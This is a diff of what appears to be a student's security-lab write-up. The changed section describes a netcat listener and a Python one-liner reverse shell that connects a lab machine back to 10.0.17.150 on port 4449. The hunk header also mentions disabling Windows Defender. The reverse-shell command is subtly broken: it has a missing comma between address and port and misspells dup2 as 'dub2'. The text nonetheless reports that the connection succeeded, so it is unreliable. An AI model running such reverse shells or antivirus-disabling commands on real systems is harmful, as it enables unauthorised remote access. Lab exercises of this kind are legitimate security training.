@@ -30,7 +30,7 @@ To disable Windows Defender simply run the command `Set-MpPreference -DisableRea
 -------
 For this final task we were asked to create a reverse shell using python3 to be able to connect back to our linux machine from the rocky machine again. To do this I first had to again create a netcat listener on my linux machine and I was again listening on port 4449. From the we again had to ssh into the rocky machine and run the reverse shell. Below is the command that I used to run the reverse shell:
 
-      python3 -c 'import socket; from subprocess import run; from os import dup2;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.17.150"4449));           dub2(s.fileno(),0); dub2(s.fileno(),1); dub2(s.fileno(),2);run(["/bin/bash","-i"]);'
+      python3 -c 'import socket; from subprocess import run; from os import dup2;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.17.150"4449));    dub2(s.fileno(),0); dub2(s.fileno(),1); dub2(s.fileno(),2);run(["/bin/bash","-i"]);'
       
 After running this I was again connected to the rocky machine through the netcat listener. 
       
